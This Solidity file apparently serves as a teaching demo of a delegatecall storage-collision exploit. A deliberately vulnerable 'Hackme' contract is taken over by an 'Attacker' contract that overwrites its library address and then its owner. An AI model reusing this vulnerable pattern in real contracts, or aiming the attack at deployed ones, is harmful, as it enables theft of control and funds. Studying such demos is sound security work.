// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Lib {
    uint256 public num;

    function doSomething(uint256 number) external {
        num = number;
    }
}

contract Hackme {
    address public lib;
    address public owner;
    uint256 public num;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function random(uint256 number) external returns(uint256) {
        (bool success, bytes memory data) = lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", number));
        require(success, "Delegatecall failed");
    }
}

contract Attacker {
    address public attacker;
    address public owner;
    uint256 public randomNum;

    Hackme public hack;

    constructor(Hackme _hack) {
        hack= _hack;
    }

    function doSomething(uint256) external {
        owner = msg.sender;
    }

    function attack() public {

        // The way you typecast an address intoa uint256 is firstly converting it into uint160 because of size 
        // and then into a uint256
        hack.random(uint256(uint160(address(this))));
        hack.random(1);
    }
}